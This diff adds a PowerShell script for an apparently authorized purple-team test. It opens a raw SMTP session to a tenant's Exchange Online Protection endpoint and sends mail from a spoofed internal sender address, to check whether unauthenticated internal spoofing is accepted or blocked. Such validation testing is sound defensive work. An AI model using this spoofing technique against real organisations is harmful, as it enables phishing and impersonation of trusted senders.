@@ -1,0 +1,72 @@
+# Full Send via Raw .NET SMTP — Ghost-Sender equivalent
+# No deprecated cmdlets, no external dependencies
+
+$eopEndpoint = "yourdomain-com.mail.protection.outlook.com"
+$port        = 25
+$mailFrom    = "ghost-sender-test@yourdomain.com"     # spoofed internal sender
+$rcptTo      = "securityteam@yourdomain.com"
+$subject     = "[PURPLE TEAM TEST] Ghost-Sender Validation - DO NOT ACTION"
+$body        = "This is an authorized Ghost-Sender spoofing validation test. If you received this, the tenant is VULNERABLE."
+
+try {
+    $tcp    = New-Object System.Net.Sockets.TcpClient($eopEndpoint, $port)
+    $stream = $tcp.GetStream()
+    $reader = New-Object System.IO.StreamReader($stream)
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true
+
+    function Read-SMTP {
+        $lines = @()
+        do { $l = $reader.ReadLine(); $lines += $l; Write-Host "  S: $l" -ForegroundColor Green }
+        while ($l -match "^\d{3}-")
+        return $lines[-1]
+    }
+
+    function Send-SMTP($cmd) {
+        Write-Host "  C: $cmd" -ForegroundColor White
+        $writer.WriteLine($cmd)
+        return Read-SMTP
+    }
+
+    Write-Host "`n[Banner]" -ForegroundColor Yellow; Read-SMTP
+    Write-Host "`n[EHLO]"   -ForegroundColor Yellow; Send-SMTP "EHLO ghost-sender-probe.invalid"
+    Write-Host "`n[MAIL FROM]" -ForegroundColor Yellow; Send-SMTP "MAIL FROM:<$mailFrom>"
+    Write-Host "`n[RCPT TO]"   -ForegroundColor Yellow
+    $rcptResp = Send-SMTP "RCPT TO:<$rcptTo>"
+
+    if ($rcptResp -match "^250") {
+        Write-Host "`n[DATA]" -ForegroundColor Yellow
+        Send-SMTP "DATA" | Out-Null
+
+        $date    = (Get-Date).ToUniversalTime().ToString("ddd, dd MMM yyyy HH:mm:ss +0000")
+        $msgId   = "<$(New-Guid)@ghost-sender-probe.invalid>"
+        $headers = @"
+From: Purple Team Test <$mailFrom>
+To: $rcptTo
+Subject: $subject
+Date: $date
+Message-ID: $msgId
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-PurpleTeam-Test: GhostSender-Validation
+
+<html><body>
+<p><strong>[AUTHORIZED PURPLE TEAM TEST]</strong></p>
+<p>$body</p>
+<p>Sent: $date</p>
+</body></html>
+.
+"@
+        $writer.Write($headers)
+        $dataResp = Read-SMTP
+        Write-Host "`n[RESULT] Message accepted: $dataResp" -ForegroundColor Red
+    }
+    elseif ($rcptResp -match "5\.7\.51") {
+        Write-Host "`n[RESULT] MITIGATED - TenantInboundAttribution active." -ForegroundColor Green
+    }
+
+    Send-SMTP "QUIT" | Out-Null
+}
+finally {
+    if ($tcp) { $tcp.Close() }
+}
